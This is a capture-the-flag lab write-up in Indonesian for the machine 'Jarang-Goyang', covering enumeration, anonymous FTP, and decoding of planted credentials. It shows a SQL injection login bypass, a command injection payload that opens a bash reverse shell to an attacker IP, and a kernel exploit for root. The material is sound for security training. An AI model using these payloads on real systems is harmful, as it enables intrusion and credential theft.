## Informasi Mesin

- **Nama Mesin**: Jarang-Goyang
    
- **Tingkat Kesulitan**: Easy
    
- **Alamat IP**: 10.1.2.103
    
- **Sistem Operasi**: Linux (CentOS)
    

## 1. Enumerasi Awal

### Scan Nmap

```bash
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 2.0.1
80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind    2 (RPC #100000)
443/tcp  open  ssl/https?
871/tcp  open  status     1 (RPC #100024)
3306/tcp open  mysql      MySQL (unauthorized)
```

### Temuan Penting:

1. **FTP (Port 21)**: Anonymous login diperbolehkan
    
2. **HTTP (Port 80)**: Web server Apache 2.0.52
    
3. **HTTPS (Port 443)**: SSL dengan sertifikat kadaluarsa
    
4. **MySQL (Port 3306)**: Database server
    

## 2. Eksplorasi FTP

### Login Anonymous

```bash
ftp 10.1.2.103
Username: anonymous
Password: [kosong]
```

### File yang Ditemukan:

Di direktori pub ditemukan file dengan clue yang terenkode:

```text
L%40njutk%40n%0D%0A%7Bpiapalen%3Apr%21k%21t%21w%7D
```

Setelah decode (URL decoding):

```text
L@njutk@n
{piapalen:pr!k!t!w}
```

**Credential diperoleh**: `piapalen:pr!k!t!w`

## 3. Eksplorasi Web Application

### SQL Injection

Pada aplikasi web ditemukan kerentanan SQL Injection dengan payload:

```text
Admin'OR'1'='1
```

Payload ini berhasil login sebagai admin dan mengakses panel administrasi.

### Command Injection

Pada form "Ping" ditemukan kerentanan OS Command Injection. Payload yang digunakan:

```bash
127.0.0.1; /bin/bash -i >& /dev/tcp/10.18.200.142/1337 0>&1
```

Payload ini memberikan reverse shell ke mesin attacker.

## 4. Privilege Escalation Awal

### Enumerasi Sistem

Setelah mendapatkan shell, dilakukan enumerasi:

```bash
cat /etc/passwd
```

Hasil menunjukkan beberapa user yang menarik:

- `piapalen` (UID 500)
    
- `biduan` (UID 501)
    
- `mysql` (UID 27)
    
- `apache` (UID 48)
    

### Penemuan Kredensial Database

Di direktori web ditemukan file backup:

```bash
/var/www/html/backup/config.backup
```

Isi file:

```php
<?php
   define('SERVER', '127.0.0.1');
   define('USERNAME', 'piapalen');
   define('PASSWORD', '66lajGGbla');
   $a = connect(SERVER,USERNAME,PASSWORD);
?>
```

**Credential database diperoleh**: `piapalen:66lajGGbla`

## 5. Lateral Movement ke User piapalen

### Login sebagai piapalen

Menggunakan credential dari FTP (`piapalen:pr!k!t!w`):

```bash
su piapalen
Password: pr!k!t!w
```

### Penemuan di Home Directory piapalen

```bash
cat titipan
Output (base64 encoded):
SGFyb2xkIGFkYWxhaCB0YXJnZXQgdXRhbWENCg0Ke2hhcm9sZDpiaWFuZ2tlcm9rfQ==
```

Setelah decode:

```text
Harold adalah target utamanya
{harold:biangkero}
```

**Credential baru diperoleh**: `harold:biangkero`

## 6. Enumerasi Sistem Lanjutan

### Informasi Kernel

```bash
uname -a
Linux Jarang-Goyang.com 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
```

**Versi Kernel**: 2.6.9-55.EL (tua dan rentan)

## 7. Privilege Escalation ke Root

### Eksploitasi Kernel Vulnerability

Menggunakan exploit `linux/local/9542.c` dari Exploit-DB yang menargetkan kernel versi 2.6.9.

Kompilasi dan eksekusi:

```bash
gcc 9542.c -o exploit
./exploit
```

### Hasil:

Eksploit berhasil memberikan akses root.

## 8. Capture the Flag

### User Flag

```bash
cat /home/biduan/user.txt

1fd68*******************
```

### Root Flag

```bash
cat /root/root.txt
a51697*****************
```